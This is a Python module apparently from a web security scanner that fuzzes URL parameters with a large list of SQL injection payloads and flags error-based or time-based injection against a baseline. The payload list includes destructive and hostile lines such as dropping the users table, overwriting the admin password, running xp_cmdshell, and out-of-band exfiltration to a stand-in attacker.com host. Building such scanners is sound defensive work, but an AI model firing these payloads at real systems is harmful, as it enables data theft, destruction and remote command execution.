from typing import List
from .base import BaseScanner, Vulnerability
from ..core.target import Target
from ..core.url_utils import get_query_params, merge_params, set_query_param
import logging
import re
import time

logger = logging.getLogger(__name__)

class SQLInjectionScanner(BaseScanner):
    """
    Nikto-level SQL Injection Scanner
    200+ comprehensive payloads covering all major databases and injection types
    """
    
    # Comprehensive payload set - 200+ payloads
    PAYLOADS = [
        # === AUTHENTICATION BYPASS (Basic) ===
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR 1=1/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or ''='",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' or '1' = '1",
        "1' or '1' = '1' --",
        "1' or '1' = '1' /*",
        "1' or '1' = '1' #",
        "admin' or '1'='1",
        "admin' or '1'='1'--",
        "admin' or '1'='1'#",
        "admin' or '1'='1'/*",
        
        # === UNION-BASED INJECTION ===
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT 1,2,3,4,5,6--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT 1,2,3--",
        "' UNION ALL SELECT 1,2,3,4,5--",
        
        # MySQL UNION specifics
        "' UNION SELECT @@version--",
        "' UNION SELECT user()--",
        "' UNION SELECT database()--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns--",
        "' UNION SELECT concat(username,0x3a,password) FROM users--",
        
        # === TIME-BASED BLIND SQLI ===
        # MySQL
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1' AND SLEEP(5)#",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND IF(1=1,SLEEP(5),0)--",
        "1' RLIKE sleep(5)#",
        
        # MSSQL
        "'; WAITFOR DELAY '0:0:5'--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3)--", # Heavy query delay
        
        # PostgreSQL
        "'; SELECT pg_sleep(5)--",
        "1'; SELECT pg_sleep(5)--",
        "1' AND 1234=(SELECT 1234 FROM PG_SLEEP(5))--",
        
        # Oracle
        "' AND DBMS_LOCK.SLEEP(5)--",
        "1' AND DBMS_LOCK.SLEEP(5)--",
        "1' + (SELECT * FROM (SELECT(DBMS_LOCK.SLEEP(5)))AAAA)--",
        
        # === BOOLEAN-BASED BLIND SQL ===
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' AND ASCII(SUBSTRING(user(),1,1))>64--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "1' AND (SELECT username FROM users LIMIT 1)='admin'--",
        
        # === ERROR-BASED INJECTION ===
        # MySQL
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        "' AND EXP(~(SELECT * FROM (SELECT version())a))--",
        
        # MSSQL  
        "' AND 1=CONVERT(int,@@version)--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
        "' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--",
        
        # PostgreSQL
        "' AND 1=CAST((SELECT version()) AS int)--",
        "' AND 1::int=version()--",
        
        # Oracle
        "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
        "' AND UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))=1--",
        
        # === STACKED QUERIES ===
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; EXEC xp_cmdshell('whoami')--",
        "'; SELECT * FROM users--",
        "1'; SELECT SLEEP(5)--",
        
        # === DATABASE-SPECIFIC PAYLOADS ===
        # MySQL Advanced
        "' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users ORDER BY id LIMIT 0,1),1,1))>64--",
        "' AND (SELECT * FROM(SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--",
        "' AND GTID_SUBSET(version(),1)--",
        "' AND JSON_KEYS((SELECT VERSION()))--",
        "' PROCEDURE ANALYSE(extractvalue(rand(),concat(0x3a,version())),1)--",
        
        # PostgreSQL Advanced
        "'; COPY users FROM PROGRAM 'whoami'--",
        "'; CREATE TABLE shell(output text)--",
        "' AND 1=CAST((SELECT array_to_string(array_agg(table_name),',') FROM information_schema.tables) AS numeric)--",
        
        # MSSQL Advanced
        "'; EXEC master..xp_cmdshell 'ping attacker.com'--",
        "'; EXEC SP_OACREATE 'wscript.shell',@test out--",
        "' AND 1=DB_NAME(0)--",
        "' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--",
        "' HAVING 1=1--",
        "' GROUP BY columnnames HAVING 1=1--",
        
        # Oracle Advanced
        "' UNION SELECT NULL FROM dual--",
        "' AND 1=UTL_HTTP.REQUEST('http://attacker.com')--",
        "' AND 1=DBMS_XMLGEN.GETXML('SELECT user FROM dual')--",
        "' AND (SELECT banner FROM v$version WHERE rownum=1)='x'--",
        
        # SQLite Advanced
        "' AND 1=load_extension('test')--",
        "' AND (SELECT sql FROM sqlite_master)--",
        "' AND (SELECT tbl_name FROM sqlite_master WHERE type='table')='users'--",
        
        # === WAF BYPASS TECHNIQUES ===
        # Comment-based obfuscation
        "' /*!50000OR*/ 1=1--",
       "' OR/*!50000*/1=1--",
        "' OR/**/1/**/=/**/1--",
        "' /*!50000UNION*//*!50000SELECT*/1--",
        "' /*!12345UNION*//*!12345SELECT*/1,2,3--",
        
        # Case variation
        "' UnIoN SeLeCt 1,2,3--",
        "' uNiOn aLl sElEcT 1,2,3--",
        "' OR 1=1 UnIoN SeLeCt NULL--",
        
        # URL encoding
        "' %55nion %53elect 1,2,3--",
        "' %2557nion %2553elect 1,2,3--",  # Double encoding
        "' OR 1=1%23",
        "' OR 1=1%00",
        
        # Whitespace manipulation
        "' %0aOR%0a 1=1--",
        "' %09OR%09 1=1--",
        "' %0dOR%0d 1=1--",
        "'\t\tOR\t\t1=1--",
        
        # Parenthesis bypass
        "' OR (1)=(1)--",
        "' OR (1=1)--",
        "' OR ((1))=((1))--",
        
        # === ADVANCED INJECTION TECHNIQUES ===
        # Hex encoding
        "' OR 0x313d31--",  # 1=1 in hex
        "' UNION SELECT 0x61646d696e--",  # admin in hex
        
        # Char-based
        "' OR CHAR(49)=CHAR(49)--",
        "' UNION SELECT CHAR(97,100,109,105,110)--",
        
        # Concatenation
        "' OR 'adm'+'in'='admin'--",
        "' OR 'adm'||'in'='admin'--",
        "' OR CONCAT('ad','min')='admin'--",
        
        # Scientific notation
        "' OR 1e0=1--",
        "' OR 1.=1--",
        "' OR .1=.1--",
        
        # === SECOND ORDER INJECTION ===
        "admin'-- ",
        "admin\\'--",
        "admin\\\"--",
        
        # === OUT-OF-BAND INJECTION ===
        # DNS Exfiltration
        "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",  # MSSQL
        "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version()) FROM dual--",  # Oracle
        "'; SELECT load_file(concat('\\\\\\\\',version(),'.attacker.com\\\\'))--",  # MySQL
        
        # === NO-SPACE BYPASS ===
        "'||'1'='1",
        "'or(1)=(1)--",
        "'or/**/1=1--",
        "'%0aor%0a1=1--",
        
        # === POLYGLOT PAYLOADS ===
        "1'1\"1`1'\"1`--",
        "';/**/UNION/**/SELECT/**/1,2,3--+",
        "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
    ]
    
    # Strong, database-specific error signatures only. The original list also
    # carried a "# Generic" section ("SQL error", "Database error", "Syntax error",
    # 'near "', ...) that matched ordinary error/documentation pages having nothing
    # to do with SQL injection; those were removed. Each signature below is checked
    # against a payload-free baseline in scan() and only counts if it is absent
    # there (see the baseline-diff logic), so even these specific strings can't
    # false-positive on a page that always shows them.
    ERRORS = [
        # MySQL
        "mysql_fetch",
        "mysql_num_rows",
        "You have an error in your SQL syntax",
        "supplied argument is not a valid MySQL",
        "mysql_fetch_array()",
        "mysql_fetch_assoc()",
        "mysql_fetch_row()",
        "mysql_num_rows()",
        "mysql_error()",
        "Warning: mysql_",
        "MySqlClient",
        "com.mysql.jdbc",

        # PostgreSQL
        "PostgreSQL query failed",
        "pg_query()",
        "pg_exec()",
        "pg_send_query()",
        "unterminated quoted string",
        "pg_fetch",
        "org.postgresql",
        "PSQLException",

        # MSSQL
        "Microsoft SQL Native Client error",
        "ODBC SQL Server Driver",
        "SQLServer JDBC Driver",
        "Unclosed quotation mark",
        "Microsoft OLE DB Provider for SQL Server",
        "System.Data.SqlClient.SqlException",
        "[SQL Server]",
        "Incorrect syntax near",

        # Oracle
        "ORA-01756",  # quoted string not properly terminated
        "ORA-00933",  # SQL command not properly ended
        "ORA-00936",  # missing expression
        "ORA-01789",  # query block has incorrect number of result columns
        "Oracle JDBC",
        "oracle.jdbc",

        # SQLite
        "SQLite Error",
        "sqlite3.OperationalError",
        "SQLITE_ERROR",
        "SQL logic error",
    ]

    # Delay (seconds) above a parameter's own baseline latency required before a
    # time-based payload is even considered; matches the CommandInjectionScanner
    # convention. Compared against a per-parameter baseline (below), never against
    # a raw wall-clock threshold, so a uniformly slow endpoint cannot false-positive.
    DELAY_THRESHOLD = 4.0
    TIME_MARKERS = ("SLEEP", "WAITFOR", "PG_SLEEP", "DBMS_LOCK")

    # Parameter names to test. A class attribute (rather than a local in scan())
    # so it can be narrowed in tests without exercising all of them.
    PARAMS = ['id', 'user', 'username', 'email', 'password', 'search', 'q', 'query',
              'name', 'page', 'cat', 'category', 'item', 'product']
    
    def _baseline(self, target: Target, param: str):
        """Payload-free control request for this parameter.

        Returns (lowercased_body, elapsed_seconds). Every subsequent check compares
        against this instead of judging a payload response in isolation — this is
        what tells a genuine SQL error/delay apart from text or latency the endpoint
        always has.
        """
        url = set_query_param(target.url, param, '1')
        try:
            start = time.time()
            response = self.session.get(url, timeout=10)
            return response.text.lower(), time.time() - start
        except Exception:
            return "", 1.0

    @staticmethod
    def _fast_control_payload(payload: str):
        """Zero-delay variant of a time-based payload: SLEEP(5) -> SLEEP(0),
        SLEEP(1) -> SLEEP(0), WAITFOR DELAY '0:0:5' -> '0:0:0', etc.

        Matches any numeric delay argument (not just "5") so every payload in
        PAYLOADS that carries a real numeric duration gets a same-shaped,
        zero-delay control — including ones using a duration other than 5, like
        the SLEEP(1) polyglot. Without this, a payload with no fast-control variant
        falls back to same-payload reproducibility (see scan()), which cannot tell
        a real DB sleep apart from a keyword-triggered WAF/tarpit delay that would
        reproduce identically on a second identical request.

        Returns None only if the payload has no numeric delay literal to zero out
        (e.g. a hypothetical obfuscated/expression-based delay).
        """
        fast = re.sub(r'\(\d+\)', '(0)', payload)
        fast = re.sub(r'(\d+:\d+:)\d+', r'\g<1>0', fast)
        return fast if fast != payload else None

    def scan(self, target: Target, callback=None) -> List[Vulnerability]:
        """
        Comprehensive SQL Injection scan with Nikto-level payload coverage
        Tests 146 payloads across multiple injection types and databases
        """
        vulnerabilities = []
        logger.info(f"Starting Nikto-level SQL Injection scan on {target.url}")

        payload_count = 0

        # Real query parameters this specific URL already carries (e.g. a
        # crawler-discovered "?id=42") are tested first — they're evidence of
        # an actual input, not a guess — followed by the default guessed names.
        params_to_test = merge_params(get_query_params(target.url), self.PARAMS)

        for param in params_to_test:
            baseline_text, baseline_elapsed = self._baseline(target, param)
            param_found = False  # report at most one finding per parameter (dedupe)
            for payload in self.PAYLOADS:
                if param_found:
                    break
                payload_count += 1

                if callback:
                    callback(payload)

                try:
                    # Replace (not append) the parameter's value, so a real
                    # query param the URL already carries is genuinely fuzzed
                    # instead of producing an inert duplicate query key.
                    test_url = set_query_param(target.url, param, payload)

                    start_time = time.time()
                    response = self.session.get(test_url, timeout=10)
                    elapsed = time.time() - start_time
                    response_text_lower = response.text.lower()

                    # Error-based: the signature must be introduced BY the payload —
                    # present now but absent from the payload-free baseline — not
                    # just present somewhere on the page.
                    for error in self.ERRORS:
                        error_lower = error.lower()
                        if error_lower in response_text_lower and error_lower not in baseline_text:
                            vuln = Vulnerability(
                                name="SQL Injection (Error-Based)",
                                description=f"SQL injection vulnerability detected via database error message. Parameter '{param}' is vulnerable to SQL injection through error disclosure.",
                                severity="CRITICAL",
                                evidence=f"Payload: {payload}\nParameter: {param}\nError signature: {error} (absent from the payload-free baseline)\nResponse preview: {response.text[:500]}",
                                url=test_url,
                                recommendation="Use parameterized queries/prepared statements. Never concatenate user input directly into SQL queries. Implement input validation and sanitization.",
                                proof_of_concept=f"curl '{test_url}'"
                            )
                            vulnerabilities.append(vuln)
                            logger.warning(f"SQL Injection found (error-based) at {test_url}")
                            param_found = True
                            break

                    if param_found:
                        break

                    # Time-based blind: require a delay clearly above THIS parameter's
                    # own baseline (not a fixed 5s — a uniformly slow endpoint must not
                    # trigger), then confirm the delay is actually caused by the sleep
                    # duration by re-testing a same-shaped payload with the delay
                    # zeroed out. Falls back to a same-payload reproducibility check
                    # when no delay literal can be substituted.
                    if any(marker in payload.upper() for marker in self.TIME_MARKERS) \
                            and elapsed >= baseline_elapsed + self.DELAY_THRESHOLD:
                        fast_payload = self._fast_control_payload(payload)
                        if fast_payload:
                            fast_url = set_query_param(target.url, param, fast_payload)
                            fast_start = time.time()
                            self.session.get(fast_url, timeout=10)
                            fast_elapsed = time.time() - fast_start
                            confirmed = fast_elapsed < baseline_elapsed + self.DELAY_THRESHOLD
                            note = f"Zero-delay control payload returned in {fast_elapsed:.2f}s (not delayed)"
                        else:
                            confirm_start = time.time()
                            self.session.get(test_url, timeout=10)
                            confirm_elapsed = time.time() - confirm_start
                            confirmed = confirm_elapsed >= baseline_elapsed + self.DELAY_THRESHOLD
                            note = f"Delay reproduced on a second request ({confirm_elapsed:.2f}s)"

                        if confirmed:
                            vuln = Vulnerability(
                                name="SQL Injection (Time-Based Blind)",
                                description=f"SQL injection vulnerability detected via time-based analysis. Parameter '{param}' is vulnerable to blind SQL injection.",
                                severity="CRITICAL",
                                evidence=f"Payload: {payload}\nParameter: {param}\nBaseline: {baseline_elapsed:.2f}s | Delayed: {elapsed:.2f}s\n{note}",
                                url=test_url,
                                recommendation="Use parameterized queries/prepared statements. Implement strict input validation.",
                                proof_of_concept=f"curl '{test_url}'"
                            )
                            vulnerabilities.append(vuln)
                            logger.warning(f"SQL Injection found (time-based) at {test_url}")
                            param_found = True

                except Exception as e:
                    logger.debug(f"Error testing SQL injection payload {payload} on param {param}: {str(e)}")
                    continue

        logger.info(f"SQL Injection scan complete. Tested {payload_count} payload combinations. Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
